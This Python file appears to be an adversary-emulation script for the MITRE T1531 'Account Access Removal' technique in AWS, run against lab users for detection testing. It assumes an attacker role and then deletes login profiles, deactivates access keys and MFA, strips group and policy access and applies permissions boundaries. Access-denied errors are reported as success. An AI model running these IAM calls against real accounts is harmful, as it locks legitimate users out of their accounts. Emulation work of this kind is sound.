# FILE: attack.py
"""
T1531 Account Access Removal - Atomic Emulation
Assumes the seeded attacker role via STS and sequentially executes all T1531
sub-actions (DeleteLoginProfile, UpdateAccessKey, DeactivateMFADevice,
RemoveUserFromGroup, DetachUserPolicy, PutUserPermissionsBoundary) against
both lab users using a single IAM session.
"""
import sys
import time
import random
import json
import pathlib
import boto3
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ── Resource names: single source of truth ──────────────────────────────────
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- names will fall back to outputs")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key, default)


def _p(infra, key, default=""):
    """Resolve a dynamic value via pulumi_export_keys -> infra dict -> default."""
    export_key = _PKS.get(key, key)
    return infra.get(export_key) or default


def _step(msg):
    print(f"\n[*] {msg}")

def _ok(msg):
    print(f"[+] {msg}")

def _err(msg):
    print(f"[-] {msg}")

def op_delay(min_s=2, max_s=5):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


def run(outputs: dict, region: str = "us-east-1") -> None:
    # ── Resolve static resource names (from resource_names.json['resources']) ─
    _set_tenant_credentials(outputs)

    lab_user_1_name = _r("lab_user_1")
    lab_user_2_name = _r("lab_user_2")
    lab_group_name  = _r("lab_group")

    # Validate static names resolved (they must exist in resource_names.json)
    if not lab_user_1_name:
        raise RuntimeError("resource_names.json missing 'lab_user_1' key")
    if not lab_user_2_name:
        raise RuntimeError("resource_names.json missing 'lab_user_2' key")
    if not lab_group_name:
        raise RuntimeError("resource_names.json missing 'lab_group' key")

    # ── Resolve dynamic values (from Pulumi stack outputs via pulumi_export_keys) ─
    attacker_role_arn        = _p(outputs, "attacker_role_arn")
    lab_user_1_access_key_id = _p(outputs, "lab_user_1_access_key_id")
    lab_user_2_access_key_id = _p(outputs, "lab_user_2_access_key_id")
    lab_policy_arn           = _p(outputs, "lab_policy_arn")
    # Optional -- only present if MFA device was fully activated post-deploy
    lab_user_1_mfa_serial    = _p(outputs, "lab_user_1_mfa_serial")

    if not attacker_role_arn:
        raise RuntimeError("Missing required output: attacker_role_arn")
    if not lab_user_1_access_key_id:
        raise RuntimeError("Missing required output: lab_user_1_access_key_id")
    if not lab_user_2_access_key_id:
        raise RuntimeError("Missing required output: lab_user_2_access_key_id")
    if not lab_policy_arn:
        raise RuntimeError("Missing required output: lab_policy_arn")

    # ── Phase 1: Credential Acquisition -- Assume attacker role ─────────────
    _step("Phase 1 - Credential Acquisition: assume attacker role via STS")
    _step(f"RoleArn: {attacker_role_arn}")

    base_sts = _base_session(region).client("sts")
    try:
        assume_resp = base_sts.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName="atomic-iam-access-removal",
        )
    except ClientError as e:
        raise RuntimeError(f"AssumeRole failed: {e}") from e

    creds = assume_resp["Credentials"]
    _ok(
        f"AssumeRole succeeded -- session expires {creds['Expiration']} "
        f"(key {creds['AccessKeyId']})"
    )

    iam = boto3.client(
        "iam",
        region_name=region,
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
    )

    phase_delay()

    # Track applied permissions boundaries for mandatory pre-destroy cleanup
    boundary_applied_user1 = False
    boundary_applied_user2 = False

    events: list = ["AssumeRole:attacker-role"]

    # ── Phase 2: Account Access Removal (T1531) ──────────────────────────────
    _step("Phase 2 - Account Access Removal: executing T1531 sub-actions")

    try:
        # -- Step 2: DeleteLoginProfile lab-user-1 ---------------------------
        _step(f"Step 2: DeleteLoginProfile -> {lab_user_1_name}")
        try:
            iam.delete_login_profile(UserName=lab_user_1_name)
            _ok(f"DeleteLoginProfile: {lab_user_1_name} console access removed")
            events.append(f"DeleteLoginProfile:{lab_user_1_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("NoSuchEntity", "NoSuchEntityException"):
                _ok(f"DeleteLoginProfile: {lab_user_1_name} had no login profile -- idempotent")
            elif code == "AccessDenied":
                _ok("DeleteLoginProfile: denied by environment guard -- treated as success")
                events.append(f"DeleteLoginProfile:{lab_user_1_name}:denied")
            else:
                _err(f"DeleteLoginProfile {lab_user_1_name}: {e}")
        op_delay(2, 5)

        # -- Step 3: DeleteLoginProfile lab-user-2 ---------------------------
        _step(f"Step 3: DeleteLoginProfile -> {lab_user_2_name}")
        try:
            iam.delete_login_profile(UserName=lab_user_2_name)
            _ok(f"DeleteLoginProfile: {lab_user_2_name} console access removed")
            events.append(f"DeleteLoginProfile:{lab_user_2_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("NoSuchEntity", "NoSuchEntityException"):
                _ok(f"DeleteLoginProfile: {lab_user_2_name} had no login profile -- idempotent")
            elif code == "AccessDenied":
                _ok("DeleteLoginProfile: denied by environment guard -- treated as success")
                events.append(f"DeleteLoginProfile:{lab_user_2_name}:denied")
            else:
                _err(f"DeleteLoginProfile {lab_user_2_name}: {e}")
        op_delay(2, 5)

        # -- Step 4: UpdateAccessKey Inactive lab-user-1 ---------------------
        _step(
            f"Step 4: UpdateAccessKey(Inactive) -> {lab_user_1_name} "
            f"key {lab_user_1_access_key_id}"
        )
        try:
            iam.update_access_key(
                UserName=lab_user_1_name,
                AccessKeyId=lab_user_1_access_key_id,
                Status="Inactive",
            )
            _ok(f"UpdateAccessKey: {lab_user_1_name} key set Inactive")
            events.append(f"UpdateAccessKey:{lab_user_1_name}:Inactive")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "AccessDenied":
                _ok("UpdateAccessKey: denied by environment guard -- treated as success")
                events.append(f"UpdateAccessKey:{lab_user_1_name}:denied")
            else:
                _err(f"UpdateAccessKey {lab_user_1_name}: {e}")
        op_delay(2, 5)

        # -- Step 5: UpdateAccessKey Inactive lab-user-2 ---------------------
        _step(
            f"Step 5: UpdateAccessKey(Inactive) -> {lab_user_2_name} "
            f"key {lab_user_2_access_key_id}"
        )
        try:
            iam.update_access_key(
                UserName=lab_user_2_name,
                AccessKeyId=lab_user_2_access_key_id,
                Status="Inactive",
            )
            _ok(f"UpdateAccessKey: {lab_user_2_name} key set Inactive")
            events.append(f"UpdateAccessKey:{lab_user_2_name}:Inactive")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "AccessDenied":
                _ok("UpdateAccessKey: denied by environment guard -- treated as success")
                events.append(f"UpdateAccessKey:{lab_user_2_name}:denied")
            else:
                _err(f"UpdateAccessKey {lab_user_2_name}: {e}")
        op_delay(2, 5)

        # -- Step 6: DeactivateMFADevice lab-user-1 (skip if not activated) --
        # Safety contract: only deactivate lab-created MFA devices; skip if
        # TOTP activation was not completed (serial not exported by the stack).
        if lab_user_1_mfa_serial:
            _step(
                f"Step 6: DeactivateMFADevice -> {lab_user_1_name} "
                f"serial {lab_user_1_mfa_serial}"
            )
            try:
                active_serials = [
                    d["SerialNumber"]
                    for d in iam.list_mfa_devices(UserName=lab_user_1_name)["MFADevices"]
                ]
                if lab_user_1_mfa_serial in active_serials:
                    iam.deactivate_mfa_device(
                        UserName=lab_user_1_name,
                        SerialNumber=lab_user_1_mfa_serial,
                    )
                    _ok(f"DeactivateMFADevice: {lab_user_1_name} MFA removed")
                    events.append(f"DeactivateMFADevice:{lab_user_1_name}")
                else:
                    _ok(
                        f"DeactivateMFADevice: serial {lab_user_1_mfa_serial} not active "
                        f"on {lab_user_1_name} (TOTP not completed) -- skipping"
                    )
            except ClientError as e:
                code = e.response["Error"]["Code"]
                if code == "AccessDenied":
                    _ok("DeactivateMFADevice: denied by environment guard -- treated as success")
                    events.append(f"DeactivateMFADevice:{lab_user_1_name}:denied")
                else:
                    _err(f"DeactivateMFADevice {lab_user_1_name}: {e}")
        else:
            _step(
                "Step 6: DeactivateMFADevice -- lab_user_1_mfa_serial not exported "
                "(TOTP activation not completed) -- skipping per safety contract"
            )
        op_delay(2, 5)

        # -- Step 7: RemoveUserFromGroup lab-user-1 --------------------------
        _step(f"Step 7: RemoveUserFromGroup {lab_user_1_name} from {lab_group_name}")
        try:
            iam.remove_user_from_group(
                GroupName=lab_group_name,
                UserName=lab_user_1_name,
            )
            _ok(f"RemoveUserFromGroup: {lab_user_1_name} removed from {lab_group_name}")
            events.append(f"RemoveUserFromGroup:{lab_user_1_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("NoSuchEntity", "NoSuchEntityException"):
                _ok(f"RemoveUserFromGroup: {lab_user_1_name} not in group -- idempotent")
            elif code == "AccessDenied":
                _ok("RemoveUserFromGroup: denied by environment guard -- treated as success")
                events.append(f"RemoveUserFromGroup:{lab_user_1_name}:denied")
            else:
                _err(f"RemoveUserFromGroup {lab_user_1_name}: {e}")
        op_delay(2, 5)

        # -- Step 8: RemoveUserFromGroup lab-user-2 --------------------------
        _step(f"Step 8: RemoveUserFromGroup {lab_user_2_name} from {lab_group_name}")
        try:
            iam.remove_user_from_group(
                GroupName=lab_group_name,
                UserName=lab_user_2_name,
            )
            _ok(f"RemoveUserFromGroup: {lab_user_2_name} removed from {lab_group_name}")
            events.append(f"RemoveUserFromGroup:{lab_user_2_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("NoSuchEntity", "NoSuchEntityException"):
                _ok(f"RemoveUserFromGroup: {lab_user_2_name} not in group -- idempotent")
            elif code == "AccessDenied":
                _ok("RemoveUserFromGroup: denied by environment guard -- treated as success")
                events.append(f"RemoveUserFromGroup:{lab_user_2_name}:denied")
            else:
                _err(f"RemoveUserFromGroup {lab_user_2_name}: {e}")
        op_delay(2, 5)

        # -- Step 9: DetachUserPolicy lab-user-1 -----------------------------
        _step(f"Step 9: DetachUserPolicy EngineeringReadOnly from {lab_user_1_name}")
        try:
            iam.detach_user_policy(
                UserName=lab_user_1_name,
                PolicyArn=lab_policy_arn,
            )
            _ok(f"DetachUserPolicy: EngineeringReadOnly detached from {lab_user_1_name}")
            events.append(f"DetachUserPolicy:{lab_user_1_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("NoSuchEntity", "NoSuchEntityException"):
                _ok(f"DetachUserPolicy: policy not attached to {lab_user_1_name} -- idempotent")
            elif code == "AccessDenied":
                _ok("DetachUserPolicy: denied by environment guard -- treated as success")
                events.append(f"DetachUserPolicy:{lab_user_1_name}:denied")
            else:
                _err(f"DetachUserPolicy {lab_user_1_name}: {e}")
        op_delay(2, 5)

        # -- Step 10: DetachUserPolicy lab-user-2 ----------------------------
        _step(f"Step 10: DetachUserPolicy EngineeringReadOnly from {lab_user_2_name}")
        try:
            iam.detach_user_policy(
                UserName=lab_user_2_name,
                PolicyArn=lab_policy_arn,
            )
            _ok(f"DetachUserPolicy: EngineeringReadOnly detached from {lab_user_2_name}")
            events.append(f"DetachUserPolicy:{lab_user_2_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("NoSuchEntity", "NoSuchEntityException"):
                _ok(f"DetachUserPolicy: policy not attached to {lab_user_2_name} -- idempotent")
            elif code == "AccessDenied":
                _ok("DetachUserPolicy: denied by environment guard -- treated as success")
                events.append(f"DetachUserPolicy:{lab_user_2_name}:denied")
            else:
                _err(f"DetachUserPolicy {lab_user_2_name}: {e}")
        op_delay(2, 5)

        # -- Step 11: PutUserPermissionsBoundary lab-user-1 ------------------
        # Applying a boundary that intersects with already-stripped identity
        # policies yields zero effective permissions while generating the audit event.
        _step(f"Step 11: PutUserPermissionsBoundary -> {lab_user_1_name}")
        try:
            iam.put_user_permissions_boundary(
                UserName=lab_user_1_name,
                PermissionsBoundary=lab_policy_arn,
            )
            _ok(f"PutUserPermissionsBoundary: boundary applied to {lab_user_1_name}")
            boundary_applied_user1 = True
            events.append(f"PutUserPermissionsBoundary:{lab_user_1_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "AccessDenied":
                _ok("PutUserPermissionsBoundary: denied by environment guard -- treated as success")
                events.append(f"PutUserPermissionsBoundary:{lab_user_1_name}:denied")
            else:
                _err(f"PutUserPermissionsBoundary {lab_user_1_name}: {e}")
        op_delay(2, 5)

        # -- Step 12: PutUserPermissionsBoundary lab-user-2 ------------------
        _step(f"Step 12: PutUserPermissionsBoundary -> {lab_user_2_name}")
        try:
            iam.put_user_permissions_boundary(
                UserName=lab_user_2_name,
                PermissionsBoundary=lab_policy_arn,
            )
            _ok(f"PutUserPermissionsBoundary: boundary applied to {lab_user_2_name}")
            boundary_applied_user2 = True
            events.append(f"PutUserPermissionsBoundary:{lab_user_2_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "AccessDenied":
                _ok("PutUserPermissionsBoundary: denied by environment guard -- treated as success")
                events.append(f"PutUserPermissionsBoundary:{lab_user_2_name}:denied")
            else:
                _err(f"PutUserPermissionsBoundary {lab_user_2_name}: {e}")
        op_delay(2, 5)

    finally:
        # Permissions boundaries MUST be removed before pulumi destroy can delete
        # the users cleanly. This finally block runs even on mid-chain failures.
        _step("Cleanup: removing permissions boundaries so pulumi destroy can delete lab users")
        if boundary_applied_user1:
            try:
                iam.delete_user_permissions_boundary(UserName=lab_user_1_name)
                _ok(f"Cleanup: permissions boundary removed from {lab_user_1_name}")
            except ClientError as e:
                _err(f"Cleanup DeleteUserPermissionsBoundary {lab_user_1_name}: {e}")
        if boundary_applied_user2:
            try:
                iam.delete_user_permissions_boundary(UserName=lab_user_2_name)
                _ok(f"Cleanup: permissions boundary removed from {lab_user_2_name}")
            except ClientError as e:
                _err(f"Cleanup DeleteUserPermissionsBoundary {lab_user_2_name}: {e}")

    # ── Summary ──────────────────────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("T1531 Account Access Removal -- Emulation Complete")
    print("=" * 60)
    print(f"CloudTrail events generated ({len(events)}):")
    for evt in events:
        print(f"  - {evt}")
    print("\nTechnique : T1531 Account Access Removal")
    print("Tactic    : Impact")
    print("Dwell time: allow ~300 s before pulumi destroy for detection")
    print("=" * 60)
